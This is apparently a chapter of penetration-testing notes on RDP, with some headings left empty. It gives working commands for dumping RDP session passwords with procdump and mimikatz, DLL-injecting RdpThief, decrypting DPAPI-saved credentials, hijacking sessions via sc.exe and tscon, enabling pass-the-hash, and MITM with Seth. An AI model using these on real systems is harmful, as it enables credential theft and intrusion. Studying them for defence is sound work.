\chapter{RDP: Remote Desktop Protocol}
\url{https://www.hackingarticles.in/remote-desktop-penetration-testing-port-3389/}
\section{Introduction}
The
\href{https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol}{Remote
Desktop Protocol (RDP)} is a protocol developed by Microsoft for remote access
to a computer running the Windows operating system. This protocol allows
display and control commands to be transmitted via the GUI encrypted over IP
networks. RDP works at the application layer in the TCP/IP reference model,
typically utilizing {\bf TCP port 3389} as the transport protocol. However, the
connectionless {\bf UDP protocol can use port 3389} also for remote administration.

For an RDP session to be established, both the network firewall and the
firewall on the server must allow connections from the outside. If
\href{https://en.wikipedia.org/wiki/Network_address_translation}{Network
Address Translation (NAT)} is used on the route between client and server, as
is often the case with Internet connections, the remote computer needs the
public IP address to reach the server. In addition, port forwarding must be set
up on the NAT router in the direction of the server.

RDP has handled
\href{https://en.wikipedia.org/wiki/Transport_Layer_Security}{Transport Layer
Security (TLS/SSL)} since Windows Vista, which means that all data, and
especially the login process, is protected in the network by its good
encryption. However, many Windows systems do not insist on this but still
accept inadequate encryption via
\href{https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/8e8b2cca-c1fa-456c-8ecb-a82fc60b2322}{RDP
Security}. Nevertheless, even with this, an attacker is still far from being
locked out because the identity-providing certificates are merely self-signed
by default. This means that the client cannot distinguish a genuine certificate
from a forged one and generates a certificate warning for the user.

The Remote Desktop service is installed by default on Windows servers and does
not require additional external applications. This service can be activated
using the Server Manager and comes with the default setting to allow
connections to the service only to hosts with
\href{https://en.wikipedia.org/wiki/Network_Level_Authentication}{Network level authentication
(NLA)}.



\section{Enumeration}


\section{Interaction}
\subsection{xfreerdp}

\section{Attacks}
\section{Brute-force attack / password spraying}
\begin{itemize}
    \item crackmapexec~\ref{tool:crackmapexec}
    \item \href{https://github.com/galkan/crowbar}{Crowbar}
    \item hydra~\ref{tool:hdyra} 
\end{itemize}


\subsection{Dumping active Session Password}

\subsubsection{Manual}
\begin{verbatim}
# find termService pid
netstat -nob | Select-String TermService -Context 1

# dump the process
procdump64.exe -ma <PID> -accepteula C:\Users\pentestlab

# search for password
strings -el svchost* | grep Password123 -C3
\end{verbatim}

\subsubsection{mimikatz}
\begin{verbatim}
privilege::debug
ts::logonpasswords
\end{verbatim}

\subsection{mstsc cleat text passwords}
The \verb+mstsc.exe+ process is created when a user opens the remote desktop connection application in order to connect to other systems via the RDP protocol. API hooking could be used to intercept the credentials provided by the user and use them for lateral movement. 

RdpThief which attempts to hook the functions used by mstsc process (CredIsMarshaledCredentialW \& CryptProtectMemory) in order to retrieve the credentials and write them into a file on the disk.

From a system that has been compromised and the mstsc.exe is running the DLL needs to be injected into the process.
\begin{verbatim}
SimpleInjector.exe mstsc.exe RdpThief.dll
\end{verbatim}


\href{https://github.com/passthehashbrowns/SharpRDPThief}{SharpRDPThief} can also be used


\subsection{Saved credentials}
RDP saved credentials are stored in an encrypted form in the Credential Manager of Windows by using the DPAPI

The location of the Windows Credentials on the disk is the following:
\begin{verbatim}
C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials
\end{verbatim}

The file can be viewed through the Mimikatz in order to identify the master key GUID:
\begin{verbatim}
dpapi::cred /in:C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\<GUID>
\end{verbatim}

access the \verb+guidMasterKey+:
\begin{verbatim}
sekurlsa::dpapi
\end{verbatim}

then decrypt de data:
\begin{verbatim}
dpapi::cred /in:C:\Users\<USERNAME>\AppData\Local\Microsoft\Credentials\<GUID>
/masterkey:<MASTER_KEY>
\end{verbatim}

Executing the following command will provide the details in which server these credentials belong.
\begin{verbatim}
vault::list
\end{verbatim}



\subsection{Session Hijacking}
To successfully impersonate a user without their password, we need to have
\verb+SYSTEM+ privileges and use the Microsoft
\href{https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon}{tscon.exe} binary that enables users to connect to another desktop session.

\begin{verbatim}
# get sessions names
query user 

tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
\end{verbatim}


With \verb+local administrator+ privileges, there are several methods to obtain
\verb+SYSTEM+ privileges, such as
\href{https://docs.microsoft.com/en-us/sysinternals/downloads/psexec}{PsExec}
or \href{https://github.com/gentilkiwi/mimikatz}{Mimikatz}. A simple trick is
to create a Windows service using
\href{https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create}{Microsoft
sc.exe} that, by default, will run as Local System and will execute any binary with SYSTEM privileges. 

\begin{verbatim}
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
net start sessionhijack
\end{verbatim}
Once the service is started, a new terminal with the lewen user session will appear.


\subsection{Pass the hash}
In order to pass the hash restricted admin must be enabled
\begin{verbatim}
reg add HKLM\System\CurrentControlSet\Control\Lsa
    /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
\end{verbatim}

Once the registry key is added, we can use xfreerdp with the option /pth to
gain RDP access.

\subsection{mitm}

For more info see \href{https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adversary-in-the-middle/rdp-mitm}{RDP MiTM}


\href{https://github.com/SySS-Research/Seth}{Seth} is a tool written in Python and Bash to MitM RDP connections by attempting to downgrade the connection in order to extract clear text credentials. It was developed to raise awareness and educate about the importance of properly configured RDP connections in the context of pentests, workshops or talks. The author is Adrian Vollmer (SySS GmbH).

\begin{verbatim}
sudo ./seth.sh <interface> <Attacker-IP> <RDP-SOURCE-IP> <RDP-TARGET-IP>
\end{verbatim}

if pivoting need to reverse forward the \verb+3389+ port

\subsection{RDPInception}
